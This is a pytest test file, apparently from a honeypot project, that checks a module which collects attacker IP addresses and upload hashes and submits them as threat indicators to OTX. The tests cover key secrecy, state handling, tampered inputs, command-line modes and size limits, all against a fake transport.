def test_the_key_never_appears_in_logs_state_events_or_errors(tmp_path, key, caplog, failure):
    caplog.set_level(logging.DEBUG)
    write_candidates(tmp_path, [ip(A)])
    fake = Fake(*([failure] if failure else []))
    out = submit(tmp_path, fake)
    submit(tmp_path, Fake(), s=settings(dry_run=True), now=NOW + datetime.timedelta(days=2))
    assert KEY not in json.dumps(out, default=str)
    assert KEY not in caplog.text
    for path in (tmp_path / "state").iterdir():
        assert KEY not in path.read_text(), path.name
    assert any(e["event"] == "otx_submit" for e in events(tmp_path))


# ---- state and events ------------------------------------------------------------------------

def test_one_event_per_run_with_counts(tmp_path, key):
    import ipaddress

    write_candidates(tmp_path, [ip(A), ip(B), sha(H1)])
    submit(tmp_path, Fake(), s=settings(max_per_run=1, hashes=False),
           networks=[ipaddress.ip_network(f"{B}/32")])
    submit(tmp_path, Fake((503, b"")), s=settings(hashes=False))
    got = events(tmp_path)
    assert [e["event"] for e in got] == ["otx_submit", "otx_submit"]
    assert got[0]["sent"] == 1 and got[0]["failed"] == 0 and got[0]["status"] == "done"
    assert got[0]["skipped"] == {"already_sent": 0, "excluded": 1, "hashes_off": 1,
                                 "over_cap": 0}
    assert got[1]["status"] == "stopped" and got[1]["stopped"] == "HTTP 503"
    assert got[1]["skipped"]["already_sent"] == 1
    for e in got:
        assert A not in json.dumps(e) and H1 not in json.dumps(e)


def test_the_sent_list_is_bounded_oldest_first(tmp_path, key):
    s = settings(max_entries=100, max_per_run=60)
    write_candidates(tmp_path, [ip(f"198.51.100.{i}") for i in range(1, 61)])
    submit(tmp_path, Fake(), s=s)
    write_candidates(tmp_path, [ip(f"203.0.113.{i}") for i in range(100, 160)])
    submit(tmp_path, Fake(), s=s, now=NOW + datetime.timedelta(hours=1))
    sent = state(tmp_path)["sent"]
    assert len(sent) == 100
    assert "IPv4|198.51.100.1" not in sent and "IPv4|203.0.113.159" in sent


@pytest.mark.parametrize("text", [
    "", "not json", "[]", '{"version": 2}', "x" * 100,
    json.dumps({"version": 1, "pulse_id": "../x", "pulse_day": TODAY,
                "sent": {"IPv4|10.0.0.1": NOW.isoformat(), "URL|http://x": NOW.isoformat(),
                         "IPv4|bad": NOW.isoformat(), f"IPv4|{A}": "never"},
                "day": "today", "day_count": -4, "backoff_minutes": 10 ** 9}),
])
def test_a_tampered_state_file_starts_clean_where_it_does_not_check(tmp_path, key, text):
    path = tmp_path / "state" / otx.STATE_FILE
    path.parent.mkdir(parents=True)
    path.write_text(text)
    write_candidates(tmp_path, [ip(A)])
    fake = Fake()
    out = submit(tmp_path, fake)
    assert out["sent"] == 1 and fake.calls[0]["method"] == "POST"


def test_state_round_trip_and_permissions(tmp_path, key):
    write_candidates(tmp_path, [ip(A), sha(H1)])
    submit(tmp_path, Fake())
    path = tmp_path / "state" / otx.STATE_FILE
    assert oct(path.stat().st_mode & 0o777) == "0o600"
    st = otx.load_state(path)
    assert set(st["sent"]) == {f"IPv4|{A}", f"FileHash-SHA256|{H1}"}
    assert st["day"] == TODAY and st["day_count"] == 2 and st["pulse_id"] == PULSE


def test_an_unwritable_state_is_reported_not_raised(tmp_path, key, monkeypatch):
    write_candidates(tmp_path, [ip(A)])

    def refuse(*a, **k):
        raise PermissionError("no")

    monkeypatch.setattr(otx, "save_state", refuse)
    out = submit(tmp_path, Fake())
    assert out["status"] == "error" and "PermissionError" in out["error"]


# ---- the command line ------------------------------------------------------------------------

def _cli(tmp_path, command, text, *extra):
    from agents.__main__ import run as cli_run

    cfg_path = tmp_path / "config.ini"
    cfg_path.write_text(text)
    return cli_run([command, "--config", str(cfg_path), "--reports-dir",
                    str(tmp_path / "reports"), "--state-dir", str(tmp_path / "state"),
                    "--log", str(tmp_path / "x.log"), "--data-dir", str(tmp_path / "data"),
                    "--no-llm", *extra])


def _no_network(monkeypatch):
    monkeypatch.setattr(otx, "UrlTransport", lambda: pytest.fail("network"))


def test_cli_run_all_writes_candidates_and_dry_runs_by_default(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    now = datetime.datetime.now(UTC)
    write_record(rec(A, seen=now), tmp_path / "reports")
    write_record(rec(B, seen=now, auth_successes=0), tmp_path / "reports")
    sidecar(tmp_path / "data" / "quarantine", "q", sha256=H1, size=10, src=A,
            stored_at=now.isoformat())
    out = _cli(tmp_path, "run-all", f"[{otx.SECTION}]\nenabled = true\n"
                                    f"[listeners]\nftp_pasv_address = {OWN}\n")
    assert out["otx"]["candidates"] == {"candidates": 2, "dropped_for_size": 0, "addresses": 1,
                                        "hashes": 1, "status": "written"}
    assert out["otx"]["submit"]["status"] == "dry run: written, nothing sent"
    preview = json.loads((tmp_path / "state" / otx.DRY_RUN_FILE).read_text())
    assert [i["indicator"] for i in preview["body"]["indicators"]] == [A, H1]
    assert (tmp_path / "reports" / "blocklist" / otx.CANDIDATES_FILE).exists()


def test_cli_agents_side_writes_and_never_sends(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    write_record(rec(A, seen=datetime.datetime.now(UTC)), tmp_path / "reports")
    out = _cli(tmp_path, "run-all", f"[{otx.SECTION}]\nenabled = true\nsubmit = false\n"
                                    "dry_run = false\n")
    assert out["otx"]["candidates"]["status"] == "written" and "submit" not in out["otx"]
    assert not (tmp_path / "state" / otx.STATE_FILE).exists()


def test_cli_ship_reads_and_sends(tmp_path, monkeypatch):
    fake = Fake()
    monkeypatch.setattr(otx, "UrlTransport", lambda: fake)
    monkeypatch.setattr(otx, "pin_address", lambda host, port, **kw: EDGE)
    monkeypatch.setenv("WINNIE_OTX_KEY", KEY)
    cand = tmp_path / "bl" / "c.json"
    cand.parent.mkdir()
    cand.write_bytes(doc([ip(A), ip(OWN)]))
    text = (f"[{otx.SECTION}]\nenabled = true\ndry_run = false\nsecret_env = WINNIE_OTX_KEY\n"
            f"candidates_file = {cand}\n[listeners]\nftp_pasv_address = {OWN}\n")
    out = _cli(tmp_path, "ship", text)
    assert "candidates" not in out["otx"]           # ship never writes the candidates
    assert out["otx"]["submit"]["sent"] == 1
    assert out["otx"]["submit"]["skipped"]["excluded"] == 1
    assert [i["indicator"] for i in fake.calls[0]["body"]["indicators"]] == [A]


def test_cli_a_bad_section_or_never_act_on_is_an_error_and_sends_nothing(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    out = _cli(tmp_path, "ship", f"[{otx.SECTION}]\nenabled = true\ntlp = purple\n")
    assert "tlp" in out["otx"]["error"]
    out = _cli(tmp_path, "ship", f"[{otx.SECTION}]\nenabled = true\n"
                                 "[respond]\nnever_act_on = not-a-network\n")
    assert "nothing submitted" in out["otx"]["error"]


def test_cli_with_the_section_off_adds_nothing(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    for text in ("", f"[{otx.SECTION}]\nenabled = false\n"):
        assert "otx" not in _cli(tmp_path, "ship", text)


# ---- size limits: the writer never produces what the reader refuses ------------------------

ALL_CLASSES = dict(auth_successes=1, honeytokens=["planted-key"],
                   high_signal={name: 1 for name in otx.ACTIVE_SIGNALS})


def fake_hash(n):
    return hashlib.sha256(f"test upload {n}".encode()).hexdigest()


def test_the_reported_case_one_source_every_class_999_hashes(tmp_path, key, monkeypatch):
    # One source with every class and 999 uploads: 273,004 bytes before the fix.
    uploads = [upload(fake_hash(n), A, NOW - datetime.timedelta(seconds=n)) for n in range(999)]
    monkeypatch.setattr(otx, "read_uploads", lambda *a, **k: uploads)
    path = tmp_path / "bl" / otx.CANDIDATES_FILE
    out = otx.write_candidates(settings(), [rec(A, protocol="postgres", **ALL_CLASSES)], [],
                               path, uploads_dir=tmp_path, cap=1000, now=NOW)
    body = path.read_bytes()
    assert len(body) <= otx.MAX_CANDIDATES_BYTES
    assert out["dropped_for_size"] > 0 and out["candidates"] + out["dropped_for_size"] == 1000
    assert out["addresses"] == 1                       # the address is never the one dropped
    kept = [i for i in json.loads(body)["indicators"] if i["type"] == otx.SHA256]
    # The newest uploads are kept.
    assert {i["indicator"] for i in kept} == {fake_hash(n) for n in range(len(kept))}
    fake = Fake()
    result = submit(tmp_path, fake, s=settings(max_per_run=500, max_per_day=5000))
    assert "error" not in result and result["candidates"] == out["candidates"]


def _largest_items(n_addresses):
    # Every field at its longest: all classes, the longest protocol name, an offset
    # timestamp; hashes are longer than addresses, so the rest are hashes.
    seen = NOW.isoformat()
    longest = max(otx.PROTOCOLS, key=len)
    items = [item(otx.IPV4, f"198.51.{100 + i // 250}.{1 + i % 250}", protocol=longest,
                  classes=tuple(otx.CLASSES), seen=NOW) for i in range(n_addresses)]
    items += [item(otx.SHA256, fake_hash(i), protocol=longest, classes=tuple(otx.CLASSES),
                   seen=NOW) for i in range(otx.MAX_CANDIDATES - n_addresses)]
    for i in items:
        i["last_seen"] = seen
    return items


@pytest.mark.parametrize("n_addresses", [0, 1, 500, otx.MAX_CANDIDATES])
def test_the_largest_document_the_writer_can_produce_is_accepted(n_addresses):
    items = _largest_items(n_addresses)
    assert len(otx.candidates_document(items, NOW)) > otx.MAX_CANDIDATES_BYTES or \
        n_addresses == otx.MAX_CANDIDATES
    kept, dropped = otx.fit_candidates(items, NOW)
    body = otx.candidates_document(kept, NOW)
    assert len(body) <= otx.MAX_CANDIDATES_BYTES
    parsed, excluded = otx.parse_candidates(body, [])
    assert len(parsed) == len(kept) == otx.MAX_CANDIDATES - dropped and excluded == 0
    # Addresses are dropped last of all.
    assert sum(1 for i in kept if i["type"] == otx.IPV4) == min(n_addresses, len(kept))
    # It uses the budget: one more item would not have fitted.
    if dropped:
        assert len(otx.candidates_document(kept + [items[-1]], NOW)) > otx.MAX_CANDIDATES_BYTES


def test_fitting_keeps_addresses_then_the_newest_hashes_in_their_order():
    old, new = NOW - datetime.timedelta(days=1), NOW
    items = ([item(otx.SHA256, fake_hash(i), seen=old) for i in range(5)]
             + [ip(A, seen=old)]
             + [item(otx.SHA256, fake_hash(10 + i), seen=new) for i in range(5)])
    one = len(json.dumps(items[0], separators=(",", ":"))) + 1
    budget = len(otx.candidates_document([], NOW)) \
        + len(json.dumps(items[5], separators=(",", ":"))) + 2 * one
    kept, dropped = otx.fit_candidates(items, NOW, budget)
    assert dropped == 8 and len(otx.candidates_document(kept, NOW)) == budget
    assert [i["indicator"] for i in kept] == [A, fake_hash(10), fake_hash(11)]
    assert otx.fit_candidates(items, NOW) == (items, 0)


def _hash_state(n, start=NOW):
    return {"day": TODAY, "day_count": 0, "pulse_day": "", "pulse_id": None,
            "backoff_until": None, "backoff_minutes": 0,
            "sent": {f"FileHash-SHA256|{fake_hash(i)}": start - datetime.timedelta(seconds=i)
                     for i in range(n)}}


def test_a_full_state_at_the_largest_max_entries_is_never_refused(tmp_path):
    top = otx.BOUNDS["max_entries"][1]
    path = tmp_path / otx.STATE_FILE
    st = _hash_state(top)
    dropped = otx.save_state(path, st, top)
    assert path.stat().st_size <= otx.MAX_STATE_BYTES
    loaded = otx.load_state(path)
    assert len(loaded["sent"]) == top - dropped > 0
    # The oldest were dropped; the newest are all still known, so they are not resent.
    assert f"FileHash-SHA256|{fake_hash(0)}" in loaded["sent"]
    assert f"FileHash-SHA256|{fake_hash(top - 1)}" not in loaded["sent"] or dropped == 0
    assert set(loaded["sent"]) == {f"FileHash-SHA256|{fake_hash(i)}"
                                   for i in range(top - dropped)}


def test_a_full_state_does_not_resend_what_it_kept(tmp_path, key):
    top = otx.BOUNDS["max_entries"][1]
    path = tmp_path / "state" / otx.STATE_FILE
    path.parent.mkdir()
    otx.save_state(path, _hash_state(top), top)
    write_candidates(tmp_path, [sha(fake_hash(i)) for i in range(5)])
    fake = Fake()
    out = submit(tmp_path, fake, s=settings(max_entries=top))
    assert out["status"] == "nothing new" and fake.calls == []
    assert path.stat().st_size <= otx.MAX_STATE_BYTES


def test_a_small_state_is_not_pruned(tmp_path):
    path = tmp_path / otx.STATE_FILE
    assert otx.save_state(path, _hash_state(50), 100) == 0
    assert len(otx.load_state(path)["sent"]) == 50
    assert otx.save_state(path, _hash_state(150), 100) == 50
